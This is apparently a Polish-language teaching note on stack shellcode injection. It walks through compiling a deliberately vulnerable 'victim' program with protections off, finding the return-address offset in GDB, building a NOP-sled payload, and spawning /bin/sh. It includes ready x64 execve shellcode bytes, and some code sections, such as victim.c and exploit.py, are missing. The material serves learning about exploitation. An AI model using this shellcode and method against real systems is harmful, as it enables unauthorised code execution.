### Shellcode Injection (Wstrzykiwanie Kodu)

**Koncepcja:**
Skoro możemy nadpisać pamięć na stosie, to dlaczego zamiast śmieci nie wpisać tam **prawdziwego kodu maszynowego** (instrukcje procesora).
A potem zmusić procesor, żeby skoczył **na stos** i go wykonał.

#### Co wstrzykujemy? (Payload)
"Wsad" do bufora:

`[ NOP Sled ] + [ SHELLCODE ] + [ ADRES POWROTU (skok na stos) ]`

1.  **Shellcode:** To ciąg bajtów, który w języku maszynowym oznacza: *"Uruchom /bin/sh"*. Jest to odpowiednik wywołania `execve("/bin/sh", 0, 0)` w asemblerze.
2.  **NOP Sled (Zjeżdżalnia):** Ponieważ ciężko jest idealnie wycelować w początek naszego kodu na stosie (adresy mogą się lekko przesuwać), wypełniamy początek bufora instrukcją `NOP` (`0x90` - No Operation). Jeśli procesor wyląduje gdziekolwiek na "zjeżdżalni", po prostu prześlizgnie się do naszego kodu.

#### Jak to zrobić w Dockerze?

Wymaga to flagi `-z execstack` (już ubyła). Bez niej procesor odmówi wykonania kodu na stosie (zabezpieczenie NX bit - No Execute).

**1. Gotowy Shellcode (x64 Linux):**
Najkrótszy kod uruchamiający shella.

Bajtowo: `\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05`

**2. Skrypt ataku (Python):**

Musimy znaleźć adres naszego bufora na stosie. 

Procesor wraca ze stosu... na stos. Zaczyna wykonywać instrukcje `NOP`, `NOP`, `NOP`... aż trafia na `execve`. Program `victim` znika, a w jego miejscu pojawia się terminal (`/bin/sh`). 

# Szczegóły

### Krok 1: Przygotowanie "Ofiary" (Kompilacja)

Tworzymy program z klasyczną luką przepełnienia bufora.

1.  **Plik `victim.c`:**


2.  **Kompilacja "bez tarcz":**

```bash
gcc -fno-stack-protector -z execstack -no-pie -g victim.c -o victim
```
*   `-fno-stack-protector`: Wyłącza kanarka (Canary).
*   `-z execstack`: Pozwala na wykonywanie kodu na stosie (wyłącza NX Bit).
*   `-no-pie`: Wyłącza losowanie adresów kodu bazowego (ułatwia analizę).

---

### Krok 2: Faza Rekonesansu (Szukamy Offsetu)

Musimy dowiedzieć się, ile dokładnie śmieci musimy wysłać, zanim nadpiszemy adres powrotu (RIP).

1.  Uruchamiamy GDB: `gdb ./victim`
2.  ... to już było

    **Wynik: 72.**
    *Wniosek: Nasz ładunek musi składać się z 72 bajtów śmieci, a następne 8 bajtów nadpisze RIP.*

---

### Krok 3: Szukanie Miejsca Wstrzyknięcia (Podejście Hakerskie)

Gdzie w pamięci leży bufor? Stos pływa, więc "strzelamy" w ciemno, używając NOP Sled. Skonstruujmy próbny ładunek, żeby zobaczyć go w pamięci.

1.  **Piszemy próbny generator w Pythonie (poza GDB):**
    ```bash
    python3 -c 'print("\x90" * 40 + "A" * 32 + "BBBBBBBB")' > test.bin
    ```

    ```bash
    python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*40 + b"A"*32 + b"BBBBBBBB")' > test.bin
    ```
    
    *Wysłaliśmy: 40 NOPów + 32 litery 'A' (razem 72 bajty) + 8 liter 'B' jako adres powrotu.*

2.  **Karmimy program w GDB tym plikiem:**
    ```gdb
    run < test.bin
    ```

3.  **Crash!** Procesor zatrzymuje się, bo próbuje skoczyć pod adres `0x4242424242424242` (czyli nasze `BBBBBBBB`).
    
    RSP pokazuje miejsce zaraz za adresem powrotu. Zagądamy "w górę" stosu (cofamy się o 100 bajtów od RSP):
    ```gdb
    x/32wx $rsp-100
    ```

4.  **Analiza pamięci na ekranie:**
    ```text
    0x7fffffffe530: 0x00000000 0x00000000 0x90909090 0x90909090 <-- ZACZYNA SIĘ NOP SLED!
    0x7fffffffe540: 0x90909090 0x90909090 0x90909090 0x90909090
    0x7fffffffe550: 0x90909090 0x90909090 0x41414141 0x41414141 <-- ZACZYNAJĄ SIĘ LITERY 'A'
    0x7fffffffe560: 0x41414141 0x41414141 0x41414141 0x41414141
    ```
    *Widzimy nasze NOPy (`0x90`)!* Wybieramy bezpieczny adres gdzieś pośrodku NOP Sled.
    **Wybieramy adres:** `0x7fffffffe540`.

---

### Krok 4: Konstrukcja Exploita (Python)

---

### Krok 5: Egzekucja (Magia rur - Pipes)

Jeśli po prostu zrobimy `./victim < exploit.bin`, program otworzy `/bin/sh`, ale shell natychmiast się zamknie, bo plik się skończył i strumień wejścia (stdin) zostanie przerwany.

"Hakerski" trik z komendą `cat`:

```bash
# 1. Generujemy ładunek do pliku
python3 exploit.py > payload.bin

# 2. Atakujemy! Nawiasy grupują wejście: najpierw leci nasz ładunek, 
# a potem 'cat' bez argumentów przechwytuje naszą klawiaturę i przesyła do Shella!
(cat payload.bin; cat) | ./victim
```

**Wynik na ekranie:**

Mimo braku znaku zachęty `$ `:
```bash
whoami
ls -la
```
*Zostaną wykonane komendy systemowe.*
**Cel osiągnięty. HACKED.**

---

